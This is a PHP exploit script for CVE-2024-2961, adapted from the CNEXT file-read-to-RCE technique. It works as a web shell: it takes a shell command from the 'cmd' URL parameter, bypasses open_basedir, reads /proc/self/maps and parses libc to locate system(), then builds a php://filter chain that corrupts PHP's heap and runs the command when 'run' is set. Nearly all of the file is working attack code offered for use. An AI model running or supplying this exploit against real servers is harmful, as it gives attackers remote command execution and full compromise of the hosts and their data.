<?php
/*
 * @author 珂字辈
 * @email sonomon@126.com
*/
ini_set('display_errors','On');
error_reporting(E_ALL);

define('HEAP_SIZE', 2 * 1024 * 1024);
define('CS', 0x100);
define('BUG', "\xe5\x8a\x84");



echo "[+]PHP_VERSION: ".PHP_VERSION."<br>\n";

@$user = posix_getpwuid(posix_geteuid())["name"];
echo "[+]user: ".$user."<br>\n";

@$command = $_GET['cmd'];
@$run = $_GET['run'];
@$sleep = $_GET['sleep'];
@$padding = $_GET['padding'];
if (empty($command)){
    $command = 'whoami';
}
if (empty($sleep)){
    $sleep = 1;
}
if (empty($padding)){
    $padding = 20;
}
echo "[+]command: ".$command."<br>\n";



/***
 *
 * @author
 * @email xiaozeend@pm.me *
 */
/*
section tables type
*/

define('SHT_NULL', 0);
define('SHT_PROGBITS', 1);
define('SHT_SYMTAB', 2);
define('SHT_STRTAB', 3);
define('SHT_RELA', 4);
define('SHT_HASH', 5);
define('SHT_DYNAMIC', 6);
define('SHT_NOTE', 7);
define('SHT_NOBITS', 8);
define('SHT_REL', 9);
define('SHT_SHLIB', 10);
define('SHT_DNYSYM', 11);
define('SHT_INIT_ARRAY', 14);
define('SHT_FINI_ARRAY', 15); //why does section tables have so many fuck type
define('SHT_GNU_HASH', 0x6ffffff6);
define('SHT_GNU_versym', 0x6fffffff);
define('SHT_GNU_verneed', 0x6ffffffe);

class elf{

    private $elf_bin;
    private $strtab_section=array();
    private $rel_plt_section=array();
    private $dynsym_section=array();
    public $shared_librarys=array();
    public $rel_plts=array();

    public function getElfBin()
    {
        return $this->elf_bin;
    }


    public function setElfBin($elf_bin)
    {
        $this->elf_bin = fopen($elf_bin,"rb");
    }

    public function unp($value)
    {
        return hexdec(bin2hex(strrev($value)));
    }

    public function get($start,$len){
        fseek($this->elf_bin,$start);
        $data=fread ($this->elf_bin,$len);
        rewind($this->elf_bin);
        return $this->unp($data);
    }

    public function get_section($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $this->elf_shoff=$this->get(0x28,8);
        $this->elf_shentsize=$this->get(0x3a,2);
        $this->elf_shnum=$this->get(0x3c,2);
        $this->elf_shstrndx=$this->get(0x3e,2);
        for ($i=0;$i<$this->elf_shnum;$i+=1){
            $sh_type=$this->get($this->elf_shoff+$i*$this->elf_shentsize+4,4);
            switch ($sh_type){
                case SHT_STRTAB:
                    $this->strtab_section[$i]=
                        array(
                            'strtab_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'strtab_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8)
                        );
                    break;

                case SHT_RELA:
                    $this->rel_plt_section[$i]=
                        array(
                            'rel_plt_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'rel_plt_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'rel_plt_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;

                case SHT_DNYSYM:
                    $this->dynsym_section[$i]=
                        array(
                            'dynsym_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                            'dynsym_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                            'dynsym_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                        );
                    break;

                case SHT_NULL:
                case SHT_PROGBITS:
                case SHT_DYNAMIC:
                case SHT_SYMTAB:
                case SHT_NOBITS:
                case SHT_NOTE:
                case SHT_FINI_ARRAY:
                case SHT_INIT_ARRAY:
                case SHT_GNU_versym:
                case SHT_GNU_HASH:
                    break;

                default:
//                    echo "who knows what $sh_type this is? ";


            }
        }
    }

    public function get_reloc(){
        $rel_plts=array();
        $dynsym_section= reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        foreach ($this->rel_plt_section as $rel_plt ){
            for ($i=$rel_plt['rel_plt_offset'];
                 $i<$rel_plt['rel_plt_offset']+$rel_plt['rel_plt_size'];
                 $i+=$rel_plt['rel_plt_entsize'])
            {
                $rel_offset=$this->get($i,8);
                $rel_info=$this->get($i+8,8)>>32;
                $fun_name_offset=$this->get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'],4);
                $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;
                $fun_name='';
                while ($this->get(++$fun_name_offset,1)!=""){
                    $fun_name.=chr($this->get($fun_name_offset,1));
                }
                $rel_plts[$fun_name]=$rel_offset;
            }
        }
        $this->rel_plts=$rel_plts;
    }

    public function get_shared_library($elf_bin=""){
        if ($elf_bin){
            $this->setElfBin($elf_bin);
        }
        $shared_librarys=array();
        $dynsym_section=reset($this->dynsym_section);
        $strtab_section=reset($this->strtab_section);
        for ($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];
             $i<$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_size'];
             $i+=$dynsym_section['dynsym_entsize'])
        {
            $shared_library_offset=$this->get($i+8,8);
            $fun_name_offset=$this->get($i,4);
            $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;
            $fun_name='';
            while ($this->get(++$fun_name_offset,1)!=""){
                $fun_name.=chr($this->get($fun_name_offset,1));
            }
            $shared_librarys[$fun_name]=$shared_library_offset;
        }
        $this->shared_librarys=$shared_librarys;
    }


    public function close(){
        fclose($this->elf_bin);
    }

    public function __destruct()
    {
        $this->close();

    }
    public function packlli($value) {
        $higher = ($value & 0xffffffff00000000) >> 32;
        $lower = $value & 0x00000000ffffffff;
        return pack('V2', $lower, $higher);
    }
}
#
# CNEXT: PHP file-read to RCE
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#
# REQUIREMENTS
#
# Requires ten: https://github.com/cfreal/ten
#
class Region {
    public $start;
    public $stop;
    public $permissions;
    public $path;
    public $size;

    function __construct($start, $stop, $permissions, $path) {
        $this->start = hexdec("0x".$start);
        $this->stop = hexdec("0x".$stop);
        $this->permissions = $permissions;
        $this->path = $path;
        $this->size = $this->stop - $this->start;
    }
}

function compare_hex_files() {
    $content1 = file_get_contents("hex_string.txt");
    $content2 = file_get_contents("hex_string2.txt");
    if ($content1 === $content2) {
        return "文件内容相同";
    } else {
        return "文件内容不同";
    }
}

function print_hex($data) {
    $hex_string = bin2hex($data);
    $file_path = "hex_string2.txt";
    
    if (file_exists($file_path)) {
        unlink($file_path);
    }
    file_put_contents($file_path, $hex_string);
    echo compare_hex_files();
}



function get_regions($maps_path) {
    $regions = [];

    $file = fopen($maps_path, 'r');
    if ($file) {
        while (($line = fgets($file)) !== false) {
            $parts = preg_split('/\s+/', $line);
            if (count($parts) >= 6) {
                list($startStop, $permissions) = $parts;
                $path = $parts[5];

                list($start, $stop) = explode('-', $startStop);

                $regions[] = new Region($start, $stop, $permissions, $path);
            }
        }
        fclose($file);
    }

    return $regions;
}
function get_libc_path($maps_path) {
    preg_match("/[\w\-\/]lib[\w\-\/]+\/(libc\-[0-9\.]+.so|libc.so.6)/", file_get_contents($maps_path), $libc);
    if (empty($libc)) {
        echo "[-]can't find libc"."<br>\n";
    } else {
        echo "[+]Libc path: ".$libc[0]."<br>\n";
    }
    return $libc[0];
}

function get_libc_base($maps_path) {
    preg_match('/(\w+)-(\w+).*?libc/', file_get_contents($maps_path), $libcgain);
    if (empty($libcgain)) {
        echo "[-]can't find Libc base"."<br>\n";
        return null;
    } else {
        $libc_base = "0x".$libcgain[1];
        echo "[+]Libc base: ".$libc_base."<br>\n";
        return hexdec($libc_base);
    }
}

function find_main_heap($regions) {
    $heaps = [];

    foreach (array_reverse($regions) as $region) {
        if ($region->permissions === "rw-p" &&
            $region->size >= HEAP_SIZE &&
            ($region->stop & (HEAP_SIZE - 1)) === 0 &&
            $region->path === "") {
                $heaps[] = $region->stop - HEAP_SIZE + 0x40;
        }
    }

    if (empty($heaps)) {
        die("[-]Unable to find PHP's main heap in memory<br>\n");
    }

    $first = $heaps[0];

    if (count($heaps) > 1) {
        $heaps_str = implode(", ", array_map(function($heap) { return '0x' . dechex($heap); }, $heaps));
        echo "[+]Potential heaps: " . $heaps_str . " (using first)<br>\n";
    } else {
        echo "[+]Using 0x" . dechex($first) . " as heap<br>\n";
    }

    return $first;
}

function chunked_chunk(string $data, int $size = null): string {
    // The caller does not care about the size: let's just add 8, which is more than enough
    if ($size === null) {
        $size = strlen($data) + 8;
    }
    $keep = strlen($data) + strlen("\n\n");
    $size_str = str_pad(dechex(strlen($data)), $size - $keep, "0", STR_PAD_LEFT);
    return $size_str . "\n" . $data . "\n";
}

function compressed_bucket(string $data): string {
    return chunked_chunk($data, 0x8000);
}
function p64($num) {
    $packed = pack("P", $num);
    return $packed;
}

function ljust($string, $length, $pad_char = ' ') {
    $pad_length = $length - strlen($string);
    if ($pad_length > 0) {
        return $string . str_repeat($pad_char, $pad_length);
    } else {
        return $string;
    }
}

function ptr_bucket($ptrs, $size = null) {
    $bucket = "";

    if ($size !== null) {
        assert(count($ptrs) * 8 == $size);
    }

    foreach ($ptrs as $ptr) {
        $bucket .= p64($ptr);
    }

    $bucket = qpe($bucket);

    $bucket = chunked_chunk($bucket);
    $bucket = chunked_chunk($bucket);
    $bucket = chunked_chunk($bucket);

    $bucket = compressed_bucket($bucket);

    return $bucket;
}

function qpe($data) {
    $result = "";
    foreach (str_split($data) as $char) {
        $result .= "=" . strtoupper(bin2hex($char));
    }
    return $result;
}
function compress($data) {
    $compressed = gzcompress($data, 9);
    $compressed = substr($compressed, 2, -4);
    return $compressed;
}

function generateRandomString($length = 30) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


function build_exploit_path($libc, $libc_base, $heap, $command, $sleep =1 ,$padding = 20){

    $ADDR_EMALLOC = $libc -> shared_librarys['malloc'] + $libc_base;
    $ADDR_EFREE = $libc -> shared_librarys['system'] + $libc_base;
    $ADDR_EREALLOC = $libc -> shared_librarys['realloc'] + $libc_base;

    $ADDR_HEAP = $heap;
    $ADDR_FREE_SLOT = $ADDR_HEAP + 0x20;
    $ADDR_CUSTOM_HEAP = $ADDR_HEAP + 0x0168;

    $ADDR_FAKE_BIN = $ADDR_FREE_SLOT - 0x10;



    // Pad needs to stay at size 0x100 at every step
    $pad_size = CS - 0x18;
    $pad = str_repeat("\x00", $pad_size);
    $pad = chunked_chunk($pad, strlen($pad) + 6);
    $pad = chunked_chunk($pad, strlen($pad) + 6);
    $pad = chunked_chunk($pad, strlen($pad) + 6);
    $pad = compressed_bucket($pad);




    $step1_size = 1;
    $step1 = str_repeat("\x00", $step1_size);
    $step1 = chunked_chunk($step1);
    $step1 = chunked_chunk($step1);
    $step1 = chunked_chunk($step1, CS);
    $step1 = compressed_bucket($step1);
    // Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    // ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

    $step2_size = 0x48;
    $step2 = str_repeat("\x00", ($step2_size + 8));
    $step2 = chunked_chunk($step2, CS);
    $step2 = chunked_chunk($step2);
    $step2 = compressed_bucket($step2);




    $step2_write_ptr = ljust("0\n", $step2_size, "\x00") . p64($ADDR_FAKE_BIN);
    $step2_write_ptr = chunked_chunk($step2_write_ptr, CS);
    $step2_write_ptr = chunked_chunk($step2_write_ptr);
    $step2_write_ptr = compressed_bucket($step2_write_ptr);
    $step3_size = CS;

    $step3 = str_repeat("\x00", $step3_size);
    assert(strlen($step3) == CS);
    $step3 = chunked_chunk($step3);
    $step3 = chunked_chunk($step3);
    $step3 = chunked_chunk($step3);
    $step3 = compressed_bucket($step3);



    $step3_overflow = str_repeat("\x00", ($step3_size - strlen(BUG))) . BUG;
    assert(strlen($step3_overflow) == CS);
    $step3_overflow = chunked_chunk($step3_overflow);
    $step3_overflow = chunked_chunk($step3_overflow);
    $step3_overflow = chunked_chunk($step3_overflow);
    $step3_overflow = compressed_bucket($step3_overflow);



    $step4_size = CS;
    $step4 = "=00" . str_repeat("\x00", ($step4_size - 1));
    $step4 = chunked_chunk($step4);
    $step4 = chunked_chunk($step4);
    $step4 = chunked_chunk($step4);
    $step4 = compressed_bucket($step4);



    $step4_pwn_ptrs = array(
        0x200000,
        0,
        # free_slot
        0,
        0,
        $ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        $ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0
    );
    $step4_custom_heap_ptrs = array($ADDR_EMALLOC, $ADDR_EFREE, $ADDR_EREALLOC);

    $step4_pwn = ptr_bucket($step4_pwn_ptrs, CS);
    $step4_custom_heap = ptr_bucket($step4_custom_heap_ptrs, 0x18);
    $step4_use_custom_heap_size = 0x140;

    $COMMAND = $command;

    $COMMAND = "kill -9 \$PPID; " . $COMMAND;
    if ($sleep) {
        $COMMAND = "sleep $sleep; " . $COMMAND;
    }
    $COMMAND = $COMMAND . "\x00";

    $command_length = strlen($COMMAND);
    if ($command_length > $step4_use_custom_heap_size) {
        throw new Exception("Command too big ($command_length), it must be strictly inferior to " . dechex($step4_use_custom_heap_size));
    }
    $COMMAND = ljust($COMMAND, $step4_use_custom_heap_size, "\x00");

    $step4_use_custom_heap = $COMMAND;
    $step4_use_custom_heap = qpe($step4_use_custom_heap);
    $step4_use_custom_heap = chunked_chunk($step4_use_custom_heap);
    $step4_use_custom_heap = chunked_chunk($step4_use_custom_heap);
    $step4_use_custom_heap = chunked_chunk($step4_use_custom_heap);
    $step4_use_custom_heap = compressed_bucket($step4_use_custom_heap);


    $pages = str_repeat($step4, 3)
        . $step4_pwn
        . $step4_custom_heap
        . $step4_use_custom_heap
        . $step3_overflow
        . str_repeat($pad, $padding)
        . str_repeat($step1, 3)
        . $step2_write_ptr
        . str_repeat($step2, 2);


    $resource = compress(compress($pages));
    $resource = base64_encode($resource);
    $resource = "data:text/plain;base64," . $resource;


    $filters = [
        // Create buckets
        "zlib.inflate",
        "zlib.inflate",

        // Step 0: Setup heap
        "dechunk",
        "convert.iconv.latin1.latin1",

        // Step 1: Reverse FL order
        "dechunk",
        "convert.iconv.latin1.latin1",

        // Step 2: Put fake pointer and make FL order back to normal
        "dechunk",
        "convert.iconv.latin1.latin1",

        // Step 3: Trigger overflow
        "dechunk",
        "convert.iconv.UTF-8.ISO-2022-CN-EXT",

        // Step 4: Allocate at arbitrary address and change zend_mm_heap
        "convert.quoted-printable-decode",
        "convert.iconv.latin1.latin1",
    ];
    $filters = implode("|", $filters);
    $path = "php://filter/read=" . $filters . "/resource=" . $resource;
    
    return $path;
}

function check_wrapper() {
    $text = generateRandomString(30);
    $php_text = 'data:text/plain;base64,'.base64_encode($text);
    if ($text == file_get_contents($php_text)) {
        echo "[+]The data:// wrapper works<br>\n";
    } else {
        echo "[-]The data:// wrapper does not works<br>\n";
        exit();
    }
    $php_text = 'php://filter//resource=data:text/plain;base64,'.base64_encode($text);
    if ($text == file_get_contents($php_text)) {
        echo "[+]The php://filter/ wrapper works<br>\n";
    } else {
        echo "[-]The php://filter/ wrapper does not works<br>\n";
        exit();
    }
    $php_text = 'php://filter/zlib.inflate/resource=data:text/plain;base64,'.base64_encode(compress($text));
    if ($text == file_get_contents($php_text)) {
        echo "[+]The zlib wrapper works<br>\n";
    } else {
        echo "[-]The zlib wrapper does not works<br>\n";
        exit();
    }
}

function check_BUG() {
    $php_text = 'php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:text/plain;base64,'.base64_encode(BUG);
    $ret = file_get_contents($php_text);
    if (strlen($ret) > 8) {
        echo "[+]have CVE-2024-2961 iconv() overflow !<br>\n";
    } else if (strlen($ret) == 8) {
        echo "[-]no CVE-2024-2961<br>\n";
        exit();
    } else {
        echo "[-]maybe error<br>\n";
        exit();
    }
}

function check_open_basedir() {
    $open_basedir = ini_get('open_basedir');
    if ($open_basedir) {
        echo "[+]open_basedir is enabled<br>\n";
        echo "[+]Configured paths: " . $open_basedir . "<br>\n";
        return true;
    } else {
        echo "[+]open_basedir is not enabled<br>\n";
        return false;
    }
}
function check_current_directory_writable() {
    $currentDirectory = getcwd();
    if (is_writable($currentDirectory)) {
        echo "[+]The current directory is writable<br>\n";
    } else {
        echo "[-]The current directory is not writable<br>\n";
        exit();
    }
}
function bypass_open_basedir() {
    @mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
    try {
        @$content = file_get_contents('/etc/hostname');
        if ($content === false) {
            echo "[-]bypass open_basedir failed<br>\n";
        }
        echo "[+]bypass open_basedir success<br>\n";
    } catch (Exception $e) {
        echo "[-]bypass open_basedir failed<br>\n";
    }
}


check_BUG();
check_wrapper();
if (check_open_basedir()) {
    check_current_directory_writable();
    bypass_open_basedir();
}

$maps_path = '/proc/self/maps';
//$maps_path = './maps';
$regions = get_regions($maps_path);

$libc_path = get_libc_path($maps_path);
//$libc_path = './libc-2.27.so';
$libc_base = get_libc_base($maps_path);

$heap = find_main_heap($regions);

$libc = new elf();
$libc -> get_section($libc_path);
$libc -> get_reloc();
$libc -> get_shared_library();

$path = build_exploit_path($libc, $libc_base, $heap, $command, $sleep, $padding);
echo "[+]build_exploit_path: <br>\n".$path."<br>\n";

if ($run) {
    file_get_contents($path);
}
